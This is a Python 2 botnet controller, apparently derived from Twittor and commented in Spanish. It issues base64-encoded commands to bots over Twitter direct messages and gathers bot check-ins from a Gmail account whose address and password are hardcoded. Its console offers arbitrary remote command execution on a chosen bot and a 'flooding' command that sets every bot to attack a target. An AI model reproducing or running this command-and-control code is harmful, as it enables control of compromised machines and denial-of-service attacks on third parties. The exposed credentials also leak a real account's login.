import tweepy
import base64
import json
import random
import string
import time
import sys
import poplib
import getpass
import email
from email.parser import Parser
from Tkinter import *
from tkFileDialog   import askopenfilename

CONSUMER_TOKEN = ''
CONSUMER_SECRET = ''

ACCESS_TOKEN = ''
ACCESS_TOKEN_SECRET = ''

USERNAME = ''
BOTS_ALIVE = []
COMMANDS = []

api = None

#
# Exception for Twittor
#


class TwittorException(Exception):
    """
        Base exception
    """

    def __init__(self, message, errors):
        Exception.__init__(self, message)
        self.errors = errors


class DecodingException(TwittorException):
    """
        Exception when trying to decode a CommandOutput
    """

# Creacion de comando en la salida decodificandolo a base64
class CommandOutput:

    def __init__(self, message):
        try:
            data = json.loads(base64.b64decode(message))
            self.data = data
            self.sender = data['sender']
            self.receiver = data['receiver']
            self.output = data['output']
            self.cmd = data['cmdlist_']
            self.jobid = data['jobid']
        except:
            raise DecodingException('Error decodificando el mensaje: %s' % message)

    def get_jobid(self):
        return self.jobid

    def get_sender(self):
        return self.sender

    def get_receiver(self):
        return self.receiver

    def get_cmd(self):
        return self.cmd

    def get_output(self):
        return self.output


# Comando a enviar,creamos un jobid y codificamos
class CommandToSend:
    def __init__(self, sender, receiver, cmd):
        self.sender = sender
        self.receiver = receiver
        self.cmd = cmd
        self.jobid = ''.join(random.sample(string.ascii_letters + string.digits, 7))

    def build(self):
        cmd = {'sender': self.sender,
                'receiver': self.receiver,
                'cmd': self.cmd,
                'jobid': self.jobid}
        return base64.b64encode(json.dumps(cmd))

    def get_jobid(self):
        return self.jobid

#Volvemos a cargar la lista de bots activos
def refresh(refresh_bots=True):
    global BOTS_ALIVE
    global COMMANDS

    if refresh_bots:
        BOTS_ALIVE = []

        print '[+] Comprobando cuantos bots hay activos...'
        cmd = CommandToSend('master', 'w00tw00tw00t', 'PING')
        jobid = cmd.get_jobid()
        api.send_direct_message(user=USERNAME, text=cmd.build())

        print '[+] Esperando 10 segundos a recibir informacion de los bots...'
        time.sleep(10)

    for message in api.direct_messages(count=200, full_text="true"):
        if (message.sender_screen_name == USERNAME):
            try:
                message = CommandOutput(message.text)
                if refresh_bots and message.get_jobid() == jobid:
                    BOTS_ALIVE.append(message)
                else:
                    COMMANDS.append(message)
            except:
                pass
    if refresh_bots:
        list_bots()


def list_bots():
    
    if (len(BOTS_ALIVE) == 0):
        print "[-] No hay bots activos"
        return
    f = open ('datos.txt','w')
   
    for bot in BOTS_ALIVE:
        print "%s: %s" % (bot.get_sender(), bot.get_output())
        f.write(bot.get_sender()+"\n")
    f.close()

def list_bots_mail():
    linea="----------------------------------------------------------------------------------------------------"
    ast="****************************************************************************************************"
    li = list()
    contador = 0
    len_max = 50
    #Accedemos a la cuenta de gmail del master
    m = poplib.POP3_SSL('pop.gmail.com',995)
    m.user('telecofather@gmail.com')
    m.pass_('seguridadevigo')
    numero = len(m.list()[1]) #numero de mensajes sin leer en la bandeja de entrada

    for i in range(numero):
        # Se lee el mensaje
        response, headerLines, bytes = m.retr(i+1)
        # Se mete todo el mensaje en un unico string
        mensaje='\n'.join(headerLines)
        # Se parsea el mensaje
        p = Parser()
        email = p.parsestr(mensaje)
        # Guardamos el campo "from" para despues comprobar que los correos son de los bots
        remitente = email["From"]
        if remitente == "telecobot@gmail.com":
            contador = contador + 1 #Si los correos son de bots, aumentamos contador y
                                    #guardamos el "asunto" ya que contiene el nombre y MAC del equipo
            li.append(linea)
            li.append(email["Subject"])
    li.append(linea)
    li.append(ast)
    li.append(str(contador) + " BOTS ACTIVOS")
    li.append(ast) #lista con todos los bots separados con guiones y asteriscos
    m.quit() # Cierre de la conexion, importante para que los correos queden "leidos"
    root = Tk() # Creamos la ventana de fondo
    root.title("Bots activos")                     
    root.geometry('500x300+700+100')
    listb = Listbox(root, width = len_max)           # Creamos un Widgets Listbox
    for item in li:                 # Insertamos los valores de la lista en el Listbox
        listb.insert(0,item)
    listb.pack()                    # Hacemos el pack del widget
    root.mainloop()                 # Ejecutamos el bucle




def list_commands():
    if (len(COMMANDS) == 0):
        print "[-] No hay comandos en el historial"
        return

    for command in COMMANDS:
        print "%s: '%s' on %s" % (command.get_jobid(), command.get_cmd(), command.get_sender())


def retrieve_command(id_command):
    # llamamos a iniciar pero con False para evitar volver a cargar los bots activos pero aun asi mostrar los comandos.
    refresh(False)
    for command in COMMANDS:
        if (command.get_jobid() == id_command):
            print "%s: %s" % (command.get_jobid(), command.get_output())
            return
    print "[-] No se ha obtenido respuesta de ese id"


def help():
    print """
    iniciar - inicializa la botnet.
    list_bots - ver bots activos mediante mensaje twitter
    list_bots_mail - Ver bots activos mediante mail en una ventana.
    list_commands - lista los comandos que se han realizado con la botnet activa
    !retrieve <jobid> - Devuelve la salida del trabajo que realizo un comando
    !cmd <MAC ADDRESS> command - ejecuta un comando concreto en un bot concreto
    flooding - Realiza un ataque por flooding desde los bots.(Primero realizar comando iniciar)
    help - ayuda
    exit - salir
    """


def main():
    global api
    auth = tweepy.OAuthHandler(CONSUMER_TOKEN, CONSUMER_SECRET)
    auth.set_access_token(ACCESS_TOKEN, ACCESS_TOKEN_SECRET)
    # Construct the API instance
    api = tweepy.API(auth)
    print "Escriba help para comprobar los comandos que puedes usar"
    refresh()
    while True:
        cmd_to_launch = raw_input('$ ')
        if (cmd_to_launch == 'iniciar'):
            refresh()
        elif (cmd_to_launch == 'list_bots'):
            list_bots()
        elif (cmd_to_launch == 'list_bots_mail'):
            abrir = open('datos.txt','r')
            while True:
                linea = abrir.readline().strip()
                if not linea: break
                cmd = CommandToSend('master',linea,'python correobot.py')
                api.send_direct_message(user=USERNAME, text=cmd.build())
                print '[+] Enviado comando "%s" a "%s" con jobid: %s' % ('Peticion de Mail',linea, cmd.get_jobid())
            print "Esperando 20 segundos a recibir los mails de los bots..."
            time.sleep(20)
            list_bots_mail()
        elif (cmd_to_launch == 'list_commands'):
            list_commands()
        elif (cmd_to_launch == 'help'):
            help()
        elif (cmd_to_launch == 'exit'):
            sys.exit(0)
        else:
            cmd_to_launch = cmd_to_launch.split(' ')
            if (cmd_to_launch[0] == "!cmd"):
                cmd = CommandToSend('master', cmd_to_launch[1], ' '.join(cmd_to_launch[2:]))
                api.send_direct_message(user=USERNAME, text=cmd.build())
                print '[+] Enviado comando "%s" con jobid: %s' % (' '.join(cmd_to_launch[2:]), cmd.get_jobid())
            elif (cmd_to_launch[0] == "!retrieve"):
                retrieve_command(cmd_to_launch[1])
            elif (cmd_to_launch[0] == "flooding"):
                abrir = open('datos.txt','r')
                while True:
                    linea = abrir.readline().strip()
                    if not linea: break
                    cmd = CommandToSend('master',linea,'python web.py')
                    api.send_direct_message(user=USERNAME, text=cmd.build())
                    print '[+] Enviado comando "%s" a "%s" con jobid: %s' % ('flooding',linea, cmd.get_jobid())
            else:
                print "[!] Ese comando no existe"

if __name__ == '__main__':
    main()